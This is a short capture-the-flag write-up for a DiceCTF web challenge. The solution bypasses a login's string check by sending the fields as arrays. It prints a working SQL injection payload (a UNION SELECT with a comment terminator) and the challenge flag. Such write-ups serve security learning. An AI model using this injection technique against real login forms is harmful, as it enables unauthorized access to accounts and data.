MISSING FLAVORTEXT
===
**Category**: Web

**Points**: 111 (224 solves)

**Author**: BrownieInMotion
### Description
- `Hmm, it looks like there's no flavortext here. Can you try and find it?`
- Site: `missing-flavortext.dicec.tf`
- Source: `index.js`
### Solution
- we need bypass `includes` ![image](https://user-images.githubusercontent.com/54855855/107364942-b37d9c80-6b0e-11eb-9b07-f9001590cbb3.png)
- debug local ![image](https://user-images.githubusercontent.com/54855855/107365585-939aa880-6b0f-11eb-9e35-127e302c4062.png)
### Payload
`username[]=admin&password[]=test'union+select+1+--+-`
### Get Flag
![image](https://user-images.githubusercontent.com/54855855/107366089-4a972400-6b10-11eb-9db6-d8aca1d04a38.png)
### Flag
`dice{sq1i_d03sn7_3v3n_3x1s7_4nym0r3}`
